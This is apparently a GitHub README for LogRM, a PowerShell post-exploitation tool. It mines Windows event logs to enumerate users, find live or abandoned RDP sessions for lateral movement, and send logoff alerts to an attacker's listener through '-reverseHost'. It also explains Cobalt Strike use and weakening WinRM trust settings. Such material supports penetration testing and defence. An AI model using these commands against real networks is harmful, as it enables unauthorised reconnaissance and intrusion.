# LogRM
LogRM is a post exploitation powershell script which it uses windows event logs to gather information about internal network in a pentration testing engagment. It is not only useful for blue teams but also for red teams because some of its functionalities can be used for lateral movement. You will be able to use LogRM not only on a localhost machine but also in a remote machine using WinRM protocol which is by default enabled in a newly Windows versions. 


## Configuration

In some cases may be you need to configure WinRM protocol to be functional

On client side (attacker):

	winrm quickconfig
	winrm set winrm/config/client '@{TrustedHosts="*"}'
		
On the server side (victim):
		
	Enable-PSRemoting -Force
	winrm quickconfig


## Usage

Use can use the following event types:

1) Information EventID (4624) - An account was successfully logged on
2) Information EventID (4625) - An account failed to log on
3) Information EventID (4728) - A member was added to a security-enabled global group
4) Information EventID (4729) - A member was removed from a security-enabled global group (*New*)
4) Information EventID (4732) - A member was added to a security-enabled local group
5) Information EventID (4733) - A member was removed from a security-enabled local group
6) Information EventID (4756) - A member was added to a security-enabled universal group (*New*)
7) Information EventID (4757) - A member was removed from security-enabled universal group (*New*)
8) Information EventID (4738) - A user account was changed
9) Information EventID (4647) - User initiated logoff
10) Information EventID (4648) - A logon was attempted using explicit credentials (*New*)
11) Information EventID (4688) - A new process has been created
12) Information EventID (4720) - A user account was created (*New*)
13) Information EventID (4738) - A user account was changed (*New*)
14) Information EventID (4776) - The domain controller attempted to validate the credentials for an account
15) Information EventID (4634) - An account was logged of (*New*)
16) Information EventID (5136) - A directory service object was modified(*New*)
17) Information EventID (400,500,501,600) - PowerShell Logs (*New*)
18) Information EventID (8001,8002,8003) - Login using NTLM Hash (*Upcoming*)
19) Information EventID (8004) - Microsoft-Windows-applocker/EXE and DLL(*New*)
20) Information EventID (8007) - Microsoft-Windows-applocker/MSI and Script (*New*)



### Scenarios

The LogRM searching into newest 10(default value) entries into all event types.

```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip>
PS> LogRM -user <username> -pass <password> -fips <file with ips>
PS> LogRM -ip 127.0.0.1
```

Search into specific eventID using -eventID parameter
```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip> -eventID <eventID>
PS> LogRM -user <username> -pass <password> -fips <file with ips> -eventID <eventID>
PS> LogRM -ip 127.0.0.1 -eventID <eventID> 
```

![alt text](https://github.com/tasox/LogRM/blob/master/Screenshots/example1_.png)

If you use -newest parameter then you will be able to search into a specific quantity of entries and in many cases your results will be more accurate.

```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip> -newest <number>
PS> LogRM -user <username> -pass <password> -fips <file with ips> -newest <number>
PS> LogRM -ip 127.0.0.1 -newest <number>
```

![alt text](https://github.com/tasox/LogRM/blob/master/Screenshots/example2_.png)

Providing the -users flag you will get as a result some valid usernames. The LogRM searches into these event IDs 4624,4625,4776 

```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip> -users
PS> LogRM -user <username> -pass <password> -fips <file with ips> -users
PS> LogRM -ip 127.0.0.1 -users
```

In earlier windows versions for example Windows server 2008, you can not have more than 5 winrm connections with the same host

## RunAS Functionality (New)

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/runas_green.png)

## Time Bomb 

TimeBomb is useful when you landed on a network host and you want to get a notification when the user is logged of and be able to use an RDP (Remote Desktop) connection. If the user has a remote desktop with another network host and after logging out left the remote desktop open then you could move into the network from an existing forgotten RDP connection. You can create a timer without creating or editing windows schedules and leave the host untouched. You have 3 option when you create a timeBomb:

1) now
2) once
3) trigger

Timebomb uses the following events:

1) Information EventID (4624) - An account was successfully logged on
2) Information EventID (4647) - User initiated logoff
3) Information Event ID (4778) - A session was reconnected to a Window Station
4) Information Event ID (4779) - A session was disconnected from a Window Station
5) Information Event ID (4800) - The workstation was locked
6) Information Event ID (4801) - The workstation was unlocked
7) Information Event ID (4802) - The screen saver was invoked
8) Information Event ID (4803) - The screen saver was dismissed

Tip1: Give as much as possible amount of entries in -newest parameter. For example: 5000


###  Intro to Windows events

Before use timebomb we have to learn the differences between windows events. Events 4778/4779 is fired up when the user is currently logged in and uses switch button to move quickly between users without locked or logout from his terminal. Events 4800 is fired up when the user press the button from keyboard (window+L) or with his mouse on start button press lockout. On the other hand 4801 is fired up after using ctrl+alt+del. Sometimes users uses screensavers not only for powersaving but also to lock their machines, in this case 4802/4803 are taking place. 

Information: In windows server 2008 events 4800/4801/4802/4803 are not created without a policy.


### Usage


The task is going to run now
```
PS> timeBomb -task now -newest <give a big number>
PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number>
```

The task is going to run now and if the user is logged of or if the screen saver is invoked then you will get a message.
```
PS> timeBomb -task now -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

### Discover if any user in loggedOn

Using timeBomb you can discover if any user is loggedOn in the case which we want to use RDP to connect with the host. TimeBomb will make some calculation between the events and behind the scene asks the following questions:

1) Is anyone loggof?
2) Is anyone who use the switch button?
3) Is anyone who use lock-out button?
4) Is anyone connected with RDP to network host? 
5) what If a screensaver is lock the host? 

#### Scenario 1 - User used RDP to connect to the remote host, after while host is locked

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/User_RDP.png)


#### Scenario 2 - User is connected with RDP to remote host, is currently in

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/User_LoggedOn_RDP2.png)


The task is going to run once at specific time.
```
PS> timeBomb -task once -at 15:00 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
PS> timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

#### Scenario 3 - User is logged of and TimeBomb sent a notification to our remote server.

![alt text](https://github.com/tasox/LogRM/blob/master/Screenshots/timebomb_notification2.png)
![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/timebomb_notification.png)


The task is going to run and stop at specific time.
```
PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

## Active Remote Desktop Sessions

RDPConn function gets only valid incoming RDP connections into the compromised host. By using this function you will be able to observe which users from which machines have connection with our host without interrupt their connection if we tried to login with the same credentials.

RDPConn function uses the following events

1) Session logon succeeded - 21
2) Session has been disconneted - 24
3) Session reconnection succeeded - 25


```
PS> RDPConn
PS> RDPConn -ip 127.0.0.1
```

#### Scenario 1

![alt text](https://github.com/tasox/LogRM/blob/master/Screenshots/RDP_winrm.png)



## CobaltStrike -and LogRM

You are able to import LogRM script into cobaltstrike and use powerpick or powershell to execute it.

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/cobaltStrike_rdpconn.png)

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/cobaltStrike_timeBomb.png)

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/cobaltStrike_errorLogin.png)


## Applocker log files

In a domain environment after implementing a GPO for to enforce applocker policy, you can use log files 8007,8004 to observe malicious actions.

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/applocker_8004.png)
![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/applocker_8007.png)

## Windows Defender history

Windows Defender function compines 2 builtin-in powershell functions Get-Threat, Get-ThreatDetection to enumerate threat history.

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/windows_defender.png)

## Windows Logs with Neo4j 

![alt_text](https://github.com/tasox/LogRM/blob/master/Screenshots/event4624_neo4j_query1.png)

## Authors

* TasoX (@taso_x)



